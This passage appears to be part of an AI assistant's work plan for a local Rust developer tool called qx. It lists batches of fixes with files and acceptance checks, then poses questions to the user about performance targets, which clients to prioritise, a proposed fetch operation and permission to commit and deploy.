| 7 | Cuts never hide asked-for data | 10, 14, 18 | `src/compact.rs`, `src/mcp.rs`, `src/fsops.rs` | `seq 400` keeps head and tail lines; `mode:"full"` returns up to the `fs read` limit; one constant for the client limit; two far-apart edits report `+1 -1` each | no |
| 8 | Fewer extra processes | 11 | `src/main.rs` stats, then `src/exec.rs` | Step 1: a number, the share of calls on the shell path. Step 2 only if the share is large: bench rows for `a && b` and `a \| b` drop to the direct-call time | no for step 1 |
| 9 | Code is easier to change | 15, Standards judgement calls | `src/fsops.rs` split, `src/setup` | Move-only commit: same tests pass, `git diff --stat` shows moves; `Map.md` updated | no |
| 10 | Old audit is closed | 17 | `src/fsops.rs:2445`, `:3007`, `src/main.rs`, `src/index.rs` | One test per item; `Handoff.md` shows each audit finding as done or as a named decision not to do it | no |
| 11 | More calls reach qx | 16 | usage logs only | A table of native versus qx edits by client and by reason, and one proposed change | yes: any change to client configs |

Notes on the batches:

- Batch 1 and 2 are small: about 30 lines of code plus tests. They can land in one sitting.
- Batch 3: commit groups by theme (fs, guard, setup, docs), not one large commit. The stale local `master` is a
  branch move; qx's own guard warns on branch deletion, so that step is yours to approve.
- Batch 5 design choice, named so you can object: ask git once per index build, not per call, and treat "git not
  found" as "no extra skips". I am not adding a `.gitignore` parser; git already is one.
- Batch 6 comes after 5 on purpose, so the first recorded baseline already has clean search replies.
- Batch 8 step 2 and batch 9 are the only large pieces. Neither should start before batch 6 gives numbers to compare against.

## Questions only you can answer

1. Targets for `Goal.md`. My proposal, from the table above: in-process calls under 2 ms median, spawned calls
   within 10 ms of the bare process cost, and a whole-repo search reply in this repo under 1 KB. Agree or change?
2. Which clients matter most after Claude Code? It decides where the setup and reply-limit work goes.
3. A built-in `fetch` op: my advice is not now. It adds a network path and a new class of security risk to a tool
   whose strength is being small and local. Your call.
4. May I commit, open the pull request and deploy when batches 1 and 2 are done, or do you want to review the diff first?
